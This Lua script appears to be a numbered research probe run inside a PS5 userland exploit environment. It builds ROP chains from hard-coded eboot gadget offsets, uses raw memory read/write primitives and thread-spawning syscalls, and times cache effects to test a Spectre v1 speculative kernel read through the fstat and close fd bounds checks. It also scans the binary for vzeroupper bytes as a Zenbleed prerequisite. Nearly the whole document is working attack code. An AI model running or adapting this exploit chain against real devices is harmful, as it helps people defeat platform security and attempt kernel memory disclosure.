-- CRASH_CLASS: MODERATE
-- PROBE 1199q: Spectre v1 against fstat fd lookup + Zenbleed gadget scan
--
-- 1199p confirmed: syscall DISPATCH has LFENCE (no speculative signal).
-- This probe tests a DIFFERENT bounds check: fget(fd) in the fstat handler.
-- Pattern: if (fd < fdtable_nfiles) { fp = fdtable[fd]; fo_stat(fp,...) }
-- The speculative fp dereference (step 3) creates more cache disturbance
-- than the dispatch because it follows a pointer into arbitrary kernel data.
--
-- Also: scan eboot for vzeroupper (C5 F8 77) — Zenbleed gadget prerequisite.
--
-- Design:
--   [0..3]   fstat(0, buf) — valid fd (baseline)
--   [4..7]   fstat(9999, buf) — invalid fd, OOB (no training)
--   [8..11]  50×fstat(0) + fstat(9999) — trained OOB
--   [12..15] 50×fstat(0) + fstat(65000) — trained, farther OOB
--   [16..19] close(-1) baseline (different handler)
--   [20..23] 50×close(-1) + close(9999) — trained close OOB

print("=== PROBE 1199q: Spectre v1 fstat fd + Zenbleed scan ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
local eb_num = N(eb)
print("eboot=" .. fmt(eb))

local g_pop_rax     = eb + 0x992
local g_pop_rdi     = eb + 0xC9DFE
local g_pop_rsi     = eb + 0xD77D
local g_pop_rdx     = eb + 0x3B02D7
local g_bare_ret    = eb + 0x42
local g_mov_m_rax   = eb + 0x92C67
local g_mov_rax_mem = eb + 0x1EEBB

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_mmap = mk(477)

-- =============================================
-- ZENBLEED GADGET SCAN
-- =============================================
print("")
print("[Zenbleed scan] looking for C5 F8 77 (vzeroupper) in eboot .text")
local vz_count = 0
local vz_offsets = {}
-- Scan first 1.5MB of eboot (text segment)
for off = 0, 0x180000 - 4, 4 do
    local dw = rd(eb_num + off)
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        -- Check bytes 0-1-2 for C5 F8 77
        if b0 == 0xC5 and b1 == 0xF8 and b2 == 0x77 then
            vz_count = vz_count + 1
            if vz_count <= 10 then
                table.insert(vz_offsets, off)
                print(string.format("  +0x%X: C5 F8 77", off))
            end
        end
        -- Check bytes 1-2-3 (cross-dword boundary)
        local b3 = math.floor(dw / 16777216) % 256
        if b1 == 0xC5 and b2 == 0xF8 and b3 == 0x77 then
            vz_count = vz_count + 1
            if vz_count <= 10 then
                table.insert(vz_offsets, off + 1)
                print(string.format("  +0x%X: C5 F8 77", off + 1))
            end
        end
    end
end
print(string.format("  total vzeroupper: %d in 1.5MB scan", vz_count))
if vz_count == 0 then
    print("  NO vzeroupper in eboot — Zenbleed gadget not available")
end

if not alive() then print("DEAD after scan"); return end

-- =============================================
-- PHASE 0: Parent-side fstat test
-- =============================================
print("")
print("[Phase 0] fstat survival (parent):")
local stat_buf = memory.alloc(0x200)
local stat_a = N(stat_buf)

local sc_fstat = mk(189)
local ok0, rv0 = pcall(function() return sc_fstat(uint64(0), uint64(stat_a)) end)
print(string.format("  fstat(0): ok=%s rv=%s", tostring(ok0), ok0 and tostring(N(rv0)) or "n/a"))

local ok1, rv1 = pcall(function() return sc_fstat(uint64(9999), uint64(stat_a)) end)
print(string.format("  fstat(9999): ok=%s rv=%s", tostring(ok1), ok1 and tostring(N(rv1)) or "n/a"))

local ok2, rv2 = pcall(function() return sc_fstat(uint64(65000), uint64(stat_a)) end)
print(string.format("  fstat(65000): ok=%s rv=%s", tostring(ok2), ok2 and tostring(N(rv2)) or "n/a"))

if not alive() then print("DEAD"); return end

-- =============================================
-- SHARED DATA
-- =============================================
local shared = memory.alloc(0x1000)
local sha = N(shared)
for i = 0, 0xFFC, 4 do wd(sha + i, 0) end

local counter_a   = sha
local done_ctr    = sha + 0x10
local done_meas   = sha + 0x18
local before_base = sha + 0x40
local after_base  = sha + 0x340

-- Probe page
local probe_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(probe_page) >= 0xFFFF0000 then print("FATAL: probe mmap"); return end
local probe_a = N(probe_page)
wq(probe_a, uint64(0xBBBB0001))

-- fstat output buffer (child uses this)
local fstat_out = memory.alloc(0x200)
local fstat_a = N(fstat_out)

-- =============================================
-- COUNTER: 400K ticks
-- =============================================
local TICKS = 400000
local ctr_buf = sc_mmap(uint64(0), uint64(0x1000000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(ctr_buf) >= 0xFFFF0000 then print("FATAL: ctr mmap"); return end
local ctr_base = N(ctr_buf)
local ss_c = 0x1000
local rsp_c = ctr_base + ss_c - ((ctr_base + ss_c) % 16) - 8

local off = 0
local function ec(v) wq(rsp_c + off, v); off = off + 8 end

ec(g_pop_rdi); ec(uint64(129))
ec(g_pop_rsi); ec(uint64(N(fs_ptr)))
ec(g_pop_rax); ec(uint64(165))
ec(stub)
ec(g_pop_rdi); ec(uint64(counter_a))
for i = 1, TICKS do
    ec(g_pop_rax); ec(uint64(i))
    ec(g_mov_m_rax)
end
ec(g_pop_rdi); ec(uint64(done_ctr))
ec(g_pop_rax); ec(uint64(0xCAFE))
ec(g_mov_m_rax)
ec(g_pop_rdi); ec(uint64(0))
ec(g_pop_rax); ec(uint64(431))
ec(stub)

-- =============================================
-- MEASUREMENT CHAIN
-- =============================================
local meas_buf = sc_mmap(uint64(0), uint64(0x800000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(meas_buf) >= 0xFFFF0000 then print("FATAL: meas mmap"); return end
local meas_base = N(meas_buf)
local ss_m = 0x2000
local rsp_m = meas_base + ss_m - ((meas_base + ss_m) % 16) - 8

local off_m = 0
local function em(v) wq(rsp_m + off_m, v); off_m = off_m + 8 end

em(g_pop_rdi); em(uint64(129))
em(g_pop_rsi); em(uint64(N(fs_ptr)))
em(g_pop_rax); em(uint64(165))
em(stub)

local function emit_prime(addr)
    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)
end

local function emit_probe(addr, idx)
    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(before_base + idx * 8))
    em(g_mov_m_rax)
    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)
    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(after_base + idx * 8))
    em(g_mov_m_rax)
end

-- fstat(fd, buf): rdi=fd, rsi=buf, rax=189
local function emit_fstat(fd)
    em(g_pop_rdi); em(uint64(fd))
    em(g_pop_rsi); em(uint64(fstat_a))
    em(g_pop_rax); em(uint64(189))
    em(stub)
end

-- close(fd): rdi=fd, rax=6
local function emit_close(fd)
    em(g_pop_rdi); em(uint64(fd))
    em(g_pop_rax); em(uint64(6))
    em(stub)
end

-- [0..3] fstat(0) — valid fd baseline
for i = 0, 3 do
    emit_prime(probe_a)
    emit_fstat(0)
    emit_probe(probe_a, i)
end

-- [4..7] fstat(9999) — invalid fd, untrained
for i = 0, 3 do
    emit_prime(probe_a)
    emit_fstat(9999)
    emit_probe(probe_a, 4 + i)
end

-- [8..11] 50×fstat(0) + fstat(9999) — trained OOB
for i = 0, 3 do
    emit_prime(probe_a)
    for t = 1, 50 do emit_fstat(0) end
    emit_fstat(9999)
    emit_probe(probe_a, 8 + i)
end

-- [12..15] 50×fstat(0) + fstat(65000) — trained farther OOB
for i = 0, 3 do
    emit_prime(probe_a)
    for t = 1, 50 do emit_fstat(0) end
    emit_fstat(65000)
    emit_probe(probe_a, 12 + i)
end

-- [16..19] close(-1) — different handler baseline
-- close(-1) returns -1 (EBADF), safe with fake TCB
for i = 0, 3 do
    emit_prime(probe_a)
    -- Use 0xFFFFFFFF for -1 as unsigned
    em(g_pop_rdi); em(uint64(0xFFFFFFFF))
    em(g_pop_rax); em(uint64(6))
    em(stub)
    emit_probe(probe_a, 16 + i)
end

-- [20..23] 50×close(-1) + close(9999) — trained close OOB
for i = 0, 3 do
    emit_prime(probe_a)
    for t = 1, 50 do
        em(g_pop_rdi); em(uint64(0xFFFFFFFF))
        em(g_pop_rax); em(uint64(6))
        em(stub)
    end
    em(g_pop_rdi); em(uint64(9999))
    em(g_pop_rax); em(uint64(6))
    em(stub)
    emit_probe(probe_a, 20 + i)
end

em(g_pop_rdi); em(uint64(done_meas))
em(g_pop_rax); em(uint64(0xBEEF))
em(g_mov_m_rax)
em(g_pop_rdi); em(uint64(0))
em(g_pop_rax); em(uint64(431))
em(stub)

print(string.format("measurement: 24 samples, %d bytes (%.1f KB)", off_m, off_m / 1024))

-- =============================================
-- LAUNCH
-- =============================================
print("")

local par_c = memory.alloc(0x40)
local pc_ = N(par_c)
for i = 0, 0x3C, 4 do wd(pc_ + i, 0) end
wq(pc_, g_bare_ret)
wq(pc_ + 0x10, uint64(ctr_base))
wq(pc_ + 0x18, uint64(ss_c))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(pc_ + 0x30, tid_c)

print("launching counter...")
pcall(function() mk(455)(uint64(pc_), uint64(0x38)) end)

local gate = 0
for p = 1, 50000 do
    local v = rd(counter_a) or 0
    if v > 0 then gate = v; break end
end
print(string.format("gate: counter=%d", gate))
if gate == 0 then print("ABORT"); return end

local par_m = memory.alloc(0x40)
local pm = N(par_m)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
wq(pm, g_bare_ret)
wq(pm + 0x10, uint64(meas_base))
wq(pm + 0x18, uint64(ss_m))
local tid_m = memory.alloc(8); wq(N(tid_m), uint64(0))
wq(pm + 0x30, tid_m)

print("launching measurement...")
pcall(function() mk(455)(uint64(pm), uint64(0x38)) end)

for w = 1, 300000 do local _ = rd(sha + 0x50) end

if not alive() then print("DEAD"); return end

local dm = rd(done_meas) or 0
print(string.format("done_meas=0x%X", dm))

-- =============================================
-- RESULTS
-- =============================================
print("")

local function read_delta(idx)
    local b = rq(before_base + idx * 8)
    local a = rq(after_base + idx * 8)
    local bh, bl = get_hi_lo(b)
    local ah, al = get_hi_lo(a)
    return al - bl
end

local groups = {
    {name="fstat(0) valid",           start=0,  count=4},
    {name="fstat(9999) untrained",    start=4,  count=4},
    {name="50×fstat(0)+fstat(9999)",  start=8,  count=4},
    {name="50×fstat(0)+fstat(65000)", start=12, count=4},
    {name="close(-1) baseline",       start=16, count=4},
    {name="50×close(-1)+close(9999)", start=20, count=4},
}

local avgs = {}
for _, g in ipairs(groups) do
    print(string.format("[%s]:", g.name))
    local sum = 0
    for i = 0, g.count - 1 do
        local d = read_delta(g.start + i)
        sum = sum + d
        print(string.format("  [%d] delta=%2d", i, d))
    end
    local avg = sum / g.count
    table.insert(avgs, {name=g.name, avg=avg})
    print("")
end

print("[SUMMARY]")
for _, a in ipairs(avgs) do
    print(string.format("  %-30s avg=%.1f ticks", a.name, a.avg))
end

local fstat_valid = avgs[1].avg
local fstat_untrained = avgs[2].avg
local fstat_trained_9999 = avgs[3].avg
local fstat_trained_65000 = avgs[4].avg
local close_base = avgs[5].avg
local close_trained = avgs[6].avg

print("")
if fstat_trained_9999 > fstat_valid + 3 or fstat_trained_65000 > fstat_valid + 3 then
    print("** SPECULATIVE SIGNAL in fstat fd lookup! **")
    print(string.format("  trained OOB fstat delta (%.1f/%.1f) > valid (%.1f)",
        fstat_trained_9999, fstat_trained_65000, fstat_valid))
elseif close_trained > close_base + 3 then
    print("** SPECULATIVE SIGNAL in close fd lookup! **")
    print(string.format("  trained close(9999) delta (%.1f) > close(-1) (%.1f)",
        close_trained, close_base))
elseif fstat_untrained < fstat_valid - 1 then
    print("** fstat OOB is lighter than valid — early return, no speculation **")
    print("  fget() bounds check likely has LFENCE or equivalent")
else
    print("** NO SPECULATIVE SIGNAL in fd lookup **")
    print("  Both syscall dispatch AND fd table lookup are mitigated")
    print("  Spectre v1 kernel read is DEAD on PS5 14.10")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 1199q COMPLETE ===")
